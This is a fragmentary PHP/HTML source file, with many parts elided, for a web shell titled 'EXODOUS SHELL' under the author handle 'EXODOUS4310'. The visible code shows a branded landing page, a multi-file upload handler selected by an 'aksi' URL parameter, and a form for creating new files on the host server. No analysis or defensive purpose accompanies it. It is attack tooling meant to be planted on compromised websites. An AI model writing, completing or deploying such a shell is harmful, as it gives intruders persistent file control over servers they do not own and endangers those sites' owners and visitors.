...
<html>
	<head>
		...
		<meta name="author" content="EXODOUS4310"/>
		<meta name="copyright" content="{ EXODOUS }"/>
		<title>{EXODOUS SHELL}</title>
			...
			<div class="container" style="margin-top: 15%">
				<div class="col-lg-6">
					<div class="form-group">
						<h1 class="text-center">{ EXODOUS4310 }</h1>
						<h5 class="text-center pb-5">Web Shell</h5>
						<form method="post">
...
.html(filenames.join(","));
		...
		if ($_GET['aksi'] == 'upload') {
			...
			if(isset($_POST['upload'])){
				...
				if($uplo){
					echo '<script>alert("Upload successfull'.$countfiles.' File");</script>';
				}else{
		...
		if ($_GET['aksi'] == 'create_file') {
			...
			<form method='POST'>
				...
				<button type='sumbit' class='btn btn-info btn-block' name='bikin'>Make!!</button><br/>
			</form>";
			echo $output;
